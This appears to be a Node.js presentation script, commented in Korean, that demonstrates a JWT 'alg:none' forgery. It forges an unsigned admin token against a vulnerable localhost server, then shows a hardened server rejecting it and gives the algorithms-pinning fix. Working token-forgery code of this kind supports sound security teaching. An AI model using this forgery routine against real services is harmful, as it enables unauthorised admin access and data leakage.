#!/usr/bin/env node
// attack.js — 발표 중 터미널에서 실행하는 공격 시연 스크립트
// 사용법: node attack.js [step]
//   step 1: 정상 로그인 → 토큰 확인
//   step 2: alg:none 위조 토큰 생성
//   step 3: 취약 서버(3001) 공격
//   step 4: 방어 서버(3002) 공격 시도 → 실패 확인
//   (인자 없으면 전체 순서대로 실행)

const VULN_URL   = 'http://localhost:3001';
const SECURE_URL = 'http://localhost:3002';

// ── Base64url 유틸 ───────────────────────────────────────────
const b64url = (obj) =>
  Buffer.from(JSON.stringify(obj))
    .toString('base64')
    .replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');

const b64decode = (str) =>
  JSON.parse(Buffer.from(str.replace(/-/g,'+').replace(/_/g,'/'), 'base64').toString());

// ── 색상 헬퍼 ────────────────────────────────────────────────
const c = {
  reset:  '\x1b[0m',
  red:    '\x1b[31m',
  green:  '\x1b[32m',
  yellow: '\x1b[33m',
  blue:   '\x1b[34m',
  cyan:   '\x1b[36m',
  bold:   '\x1b[1m',
  dim:    '\x1b[2m',
};

const print = (msg)         => console.log(msg);
const ok    = (msg)         => console.log(`${c.green}  ✅ ${msg}${c.reset}`);
const fail  = (msg)         => console.log(`${c.red}  ❌ ${msg}${c.reset}`);
const info  = (msg)         => console.log(`${c.cyan}  ℹ  ${msg}${c.reset}`);
const code  = (msg)         => console.log(`${c.dim}     ${msg}${c.reset}`);
const title = (step, msg)   => console.log(`\n${c.bold}${c.yellow}[STEP ${step}] ${msg}${c.reset}`);
const sep   = ()            => console.log(`${c.dim}${'─'.repeat(55)}${c.reset}`);

// ── 딜레이 ───────────────────────────────────────────────────
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// ── HTTP 요청 헬퍼 ───────────────────────────────────────────
async function request(method, url, { body, token } = {}) {
  const headers = { 'Content-Type': 'application/json' };
  if (token) headers['Authorization'] = `Bearer ${token}`;

  const res = await fetch(url, {
    method,
    headers,
    body: body ? JSON.stringify(body) : undefined,
  });

  const data = await res.json().catch(() => ({}));
  return { status: res.status, data };
}

// ══════════════════════════════════════════════════════════════
// STEP 1 — 정상 로그인
// ══════════════════════════════════════════════════════════════
async function step1() {
  title(1, '정상 로그인 → JWT 토큰 확인');
  sep();

  info('user / user123 으로 로그인 요청');
  code(`POST ${VULN_URL}/api/login`);

  const { status, data } = await request('POST', `${VULN_URL}/api/login`, {
    body: { username: 'user', password: 'user123' },
  });

  if (status !== 200) { fail(`로그인 실패 (${status})`); return null; }

  ok(`로그인 성공 (${status} OK)`);

  const token = data.token;
  const [h, p] = token.split('.');
  const header  = b64decode(h);
  const payload = b64decode(p);

  print('');
  info('토큰 Header 디코딩:');
  code(JSON.stringify(header, null, 2).split('\n').map(l => '     '+l).join('\n'));
  info('토큰 Payload 디코딩:');
  code(JSON.stringify(payload, null, 2).split('\n').map(l => '     '+l).join('\n'));

  print('');
  info(`현재 role: ${c.green}"${payload.role}"${c.reset}${c.cyan} → 일반 유저`);

  return token;
}

// ══════════════════════════════════════════════════════════════
// STEP 2 — alg:none 위조 토큰 생성
// ══════════════════════════════════════════════════════════════
async function step2(originalToken) {
  title(2, 'alg:none 위조 토큰 생성');
  sep();

  const [, p] = originalToken.split('.');
  const originalPayload = b64decode(p);

  info('원본 Payload:');
  code(`role: "${originalPayload.role}",  alg: "HS256"`);

  await sleep(600);

  info('Header 변조: alg → "none"');
  code(`{ "alg": "none", "typ": "JWT" }`);

  await sleep(600);

  info('Payload 변조: role → "admin"');
  code(`{ ..., "role": "admin" }`);

  await sleep(600);

  // 위조 토큰 생성
  const forgedHeader  = { alg: 'none', typ: 'JWT' };
  const forgedPayload = { ...originalPayload, role: 'admin' };
  const forgedToken   = `${b64url(forgedHeader)}.${b64url(forgedPayload)}.`;

  info('Signature 제거 → 위조 토큰 완성:');
  code(`${c.red}${forgedToken.substring(0, 60)}...${c.reset}`);

  print('');
  ok('위조 토큰 생성 완료 (서명 없음!)');

  return forgedToken;
}

// ══════════════════════════════════════════════════════════════
// STEP 3 — 취약 서버 공격
// ══════════════════════════════════════════════════════════════
async function step3(forgedToken) {
  title(3, `취약 서버(포트 3001) 공격 → 관리자 접근`);
  sep();

  info('위조 토큰으로 /api/admin 요청');
  code(`GET ${VULN_URL}/api/admin`);
  code(`Authorization: Bearer ${forgedToken.substring(0, 40)}...`);

  await sleep(800);

  const { status, data } = await request('GET', `${VULN_URL}/api/admin`, {
    token: forgedToken,
  });

  print('');
  if (status === 200) {
    print(`${c.red}${c.bold}  🚨 서버 응답: ${status} OK${c.reset}`);
    fail('alg:none 토큰 허용됨!');
    fail('서명 검증 완전히 우회됨!');
    print('');
    info('유출된 관리자 데이터:');
    data.orders?.slice(0, 3).forEach(o => {
      code(`  ${o.id}  ${o.user.padEnd(6)}  ${o.product}`);
    });
    code(`  ... 총 ${data.orders?.length}건`);
  } else {
    ok(`공격 실패 (${status}) — 예상치 못한 결과`);
  }

  return status === 200;
}

// ══════════════════════════════════════════════════════════════
// STEP 4 — 방어 서버에서 동일 공격 시도
// ══════════════════════════════════════════════════════════════
async function step4(forgedToken) {
  title(4, `방어 서버(포트 3002) 동일 공격 → 차단 확인`);
  sep();

  info('동일한 위조 토큰으로 /api/admin 요청');
  code(`GET ${SECURE_URL}/api/admin`);

  await sleep(800);

  const { status, data } = await request('GET', `${SECURE_URL}/api/admin`, {
    token: forgedToken,
  });

  print('');
  if (status === 401) {
    print(`${c.green}${c.bold}  🛡️  서버 응답: ${status} Unauthorized${c.reset}`);
    ok('alg:none 즉시 거부!');
    ok(`오류 메시지: "${data.error}"`);
    print('');
    info('방어 코드 핵심:');
    code(`jwt.verify(token, SECRET, ${c.green}{ algorithms: ['HS256'] }${c.reset})`);
    ok('algorithms 옵션 하나로 공격 완전 차단');
  } else {
    fail(`예상치 못한 응답: ${status}`);
  }
}

// ══════════════════════════════════════════════════════════════
// 메인 실행
// ══════════════════════════════════════════════════════════════
async function main() {
  const step = process.argv[2] ? parseInt(process.argv[2]) : 0;

  console.log(`\n${c.bold}${c.blue}╔══════════════════════════════════════════╗`);
  console.log(`║     JWT alg:none 공격 시연 스크립트      ║`);
  console.log(`╚══════════════════════════════════════════╝${c.reset}`);

  let token, forgedToken;

  try {
    if (step === 0 || step === 1) { token = await step1(); await sleep(500); }
    if (step === 0 || step === 2) { forgedToken = await step2(token || await getToken()); await sleep(500); }
    if (step === 0 || step === 3) { await step3(forgedToken || process.argv[3]); await sleep(500); }
    if (step === 0 || step === 4) { await step4(forgedToken || process.argv[3]); }
  } catch (e) {
    fail(`오류 발생: ${e.message}`);
    info('서버가 실행 중인지 확인하세요:');
    code('node server-vulnerable.js  # 취약 서버 (포트 3001)');
    code('node server-secure.js      # 방어 서버 (포트 3002)');
  }

  console.log('');
}

async function getToken() {
  const { data } = await request('POST', `${VULN_URL}/api/login`, {
    body: { username: 'user', password: 'user123' },
  });
  return data.token;
}

main();
